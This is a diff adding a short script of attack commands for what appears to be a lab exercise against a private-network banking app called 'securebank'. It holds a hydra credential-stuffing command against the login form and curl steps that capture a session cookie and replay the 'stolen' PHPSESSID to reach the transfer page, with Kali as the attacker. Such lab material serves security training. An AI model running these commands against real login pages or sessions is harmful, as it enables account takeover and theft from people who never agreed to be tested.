@@ -1,0 +1,14 @@
+# Stage One: Credential stuffing attack
+hydra -L usernames.txt -P stuffing_passwords.txt 192.168.1.30 http-post-form \
+"/securebank/login.php:username=^USER^&password=^PASS^:Invalid username"
+
+# Stage Two, Task 2: Session hijack simulation
+# Step 1 - capture a real session (run on Debian or as the "customer"):
+curl -c cookies.txt -X POST http://192.168.1.30/securebank/login.php \
+-d "username=jsmith&password=Winter2026!"
+
+# Step 2 - extract the session ID:
+cat cookies.txt
+
+# Step 3 - replay the stolen session from Kali (the "attacker"):
+curl --cookie "PHPSESSID=<stolen_session_id>" http://192.168.1.30/securebank/transfer.php
